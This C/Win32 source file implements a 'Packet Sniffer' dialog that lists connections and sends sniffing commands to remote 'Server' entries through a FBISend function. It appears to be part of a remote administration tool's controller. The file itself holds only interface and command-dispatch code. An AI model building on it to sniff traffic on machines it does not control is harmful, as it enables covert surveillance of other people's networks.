#include "Main.h"
#include "resource.h"
#include "PacketHead.h"

void SetWindow(HWND hwnd)
{
	RECT rc;
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PACKET),0,25,rc.right - 5, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_PORTS),0,25,rc.right - 5, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_MAIN_STATUS),0,rc.bottom - 20,rc.right, 20, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 25, TRUE);
}

LRESULT CALLBACK PacketProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	LV_COLUMN	col;
	LV_ITEM		item;
	TCITEM tie;

	char WindowId [12] = "";
	char Data[12] = "";
	switch(message)
	{
		////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		SetWindow(hwnd);		
		ShowWindow(GetDlgItem(hwnd, IDC_PACKET), FALSE);
		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_PORTS),LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=100;		
		col.pszText="Local IP";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PORTS),0,&col);
		
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=70;		
		col.pszText="Local Port";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PORTS),1,&col);
		
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=150;		
		col.pszText="Remote IP";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PORTS),2,&col);

		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=70;		
		col.pszText="Remote Port";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PORTS),3,&col);

		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=100;		
		col.pszText="State";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PORTS),4,&col);

//////////////////////////////////////////
//
		tie.mask = TCIF_TEXT | TCIF_IMAGE;  
		tie.pszText = "Connection's";		
		TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB2), 0, &tie);
		
		tie.mask = TCIF_TEXT | TCIF_IMAGE;  
		tie.pszText = "Packet Sniff";		
		TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB2), 1, &tie);	
		
		CreateWindowEx(0, STATUSCLASSNAME, NULL, WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0, hwnd, (HMENU)IDC_MAIN_STATUS, GetModuleHandle(NULL), NULL);		
		
		GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowId, 12);
		FBISend(Server[atoi(WindowId)], "", 0,0,0, PACKET_SNIFFER);
	//	FBISend(Server[atoi(WindowId)], "", atoi(WindowId), 80,0, PACKET_SNIFFER_PORTS);
		break;
	case WM_NOTIFY:
		 switch(wParam)
		 {
		 case IDC_TAB2:
			 switch (((LPNMHDR)lParam)->code)
			 {
			 case TCN_SELCHANGE:
				 int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_TAB2)); 
				 switch(iPage)
				 {
				 case 0:
					 ShowWindow(GetDlgItem(hwnd, IDC_PACKET), SW_HIDE);
					 ShowWindow(GetDlgItem(hwnd, IDC_PORTS), SW_SHOW);
					 break;					 
				 case 1:
					 ShowWindow(GetDlgItem(hwnd, IDC_PORTS), SW_HIDE);
					 ShowWindow(GetDlgItem(hwnd, IDC_PACKET), SW_SHOW);
					 break;					 
				 }
				 
				 break;
				 
			 }
		case IDC_PORTS:
				 switch (((LPNMHDR)lParam)->code)
				 {					 
				 case NM_DBLCLK:
					 GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowId, 12);
					 item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_PORTS),-1,LVNI_SELECTED);
					 item.mask=LVIF_TEXT;
					 item.iSubItem=1;
					 item.pszText=Data;
					 item.cchTextMax=sizeof(Data);
					 ListView_GetItem(GetDlgItem(hwnd,IDC_PORTS),&item); 
					 FBISend(Server[atoi(WindowId)], "", atoi(WindowId), atoi(Data),0, PACKET_SNIFFER_PORTS);
					 TabCtrl_SetCurSel(GetDlgItem(hwnd,IDC_TAB2),1);
					 ShowWindow(GetDlgItem(hwnd, IDC_PORTS), SW_HIDE);
					 ShowWindow(GetDlgItem(hwnd, IDC_PACKET), SW_SHOW);
					 break;
				}
				 break;

		 }
					break;
	case WM_SIZING:
		switch(wParam)
		{
		case WMSZ_BOTTOM:
		SetWindow(hwnd);
			break;
		case WMSZ_BOTTOMLEFT:
		SetWindow(hwnd);
			break;
		case WMSZ_BOTTOMRIGHT:
		SetWindow(hwnd);
			break;
		case WMSZ_LEFT:
		SetWindow(hwnd);
			break;
		case WMSZ_RIGHT:
		SetWindow(hwnd);
			break;
		case WMSZ_TOP:
		SetWindow(hwnd);
			break;
		case WMSZ_TOPLEFT:
		SetWindow(hwnd);
			break;
		case WMSZ_TOPRIGHT:
		SetWindow(hwnd);
			break;
		}
			break;
		case WM_COMMAND:
			switch(wParam)
			{
			case IDC_REFRESH:
				GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowId, 12);
				ListView_DeleteAllItems(GetDlgItem(hwnd, IDC_PORTS));
				FBISend(Server[atoi(WindowId)], "", 0,0,0, PACKET_SNIFFER_PORTS_REFRESH);								
				break;
				
			case IDCANCEL:				
				GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowId, 12);
				FBISend(Server[atoi(WindowId)], "", 0,0,0, PACKET_SNIFFER_PORTS_CLOSE);
				PacketHwnd[atoi(WindowId)] = NULL;
				EndDialog(hwnd, 0);
				break;
			}
	}
return 0;
}
HINSTANCE PacketInst;
DWORD WINAPI PacketWindow(LPVOID lpParam)
{
	int LID = (int)lpParam;
	char WindowText [50] = "";
    char TID [12] = "";
	RECT rc;
	
	PacketHwnd[LID]=CreateDialog(PacketInst,(LPCTSTR)IDD_PACKETSNIFF,NULL,(DLGPROC)PacketProc);
	ShowWindow(PacketHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(PacketHwnd[LID], IDC_ID),SW_HIDE);
	
	sprintf(WindowText, "Packet Sniffer - %s", Information[LID].Buf3);
	SetWindowText(PacketHwnd[LID], WindowText);
	
	sprintf(TID, "%d", LID);
	SetWindowText(GetDlgItem(PacketHwnd[LID], IDC_ID), TID);
	GetClientRect(PacketHwnd[LID], &rc);
	MSG msg;
	InitCommonControls();
	while(GetMessage(&msg,PacketHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
void SetPacketWindow(char * Data, int ID)
{
	HWND hEdit;
	int ndx;
				hEdit = GetDlgItem (PacketHwnd[ID], IDC_PACKET);
				ndx = GetWindowTextLength (hEdit);
				SetFocus (hEdit);
				SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Data));
}

void SetPortWindow(char * LocalIp, char * LocalPort, char * RemoteIp, char * RemotePort, char * Sate, int ID)
{
	LV_ITEM	item;	
    struct hostent *remoteHost;
    char *host_name;
    struct in_addr addr;
    DWORD dwError;

	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	ListView_GetItemCount(GetDlgItem(PacketHwnd[ID],IDC_PORTS));
	
	item.iSubItem=0;
	item.pszText=LocalIp;
	item.iItem=ListView_InsertItem(GetDlgItem(PacketHwnd[ID],IDC_PORTS),&item);

	item.iSubItem=1;
	item.pszText=LocalPort;
	ListView_SetItem(GetDlgItem(PacketHwnd[ID],IDC_PORTS),&item);

	item.iSubItem=2;
	item.pszText=RemoteIp;
	ListView_SetItem(GetDlgItem(PacketHwnd[ID],IDC_PORTS),&item);

	item.iSubItem=3;
	item.pszText=RemotePort;
	ListView_SetItem(GetDlgItem(PacketHwnd[ID],IDC_PORTS),&item);

	item.iSubItem=4;
	item.pszText=Sate;
	ListView_SetItem(GetDlgItem(PacketHwnd[ID],IDC_PORTS),&item);
}
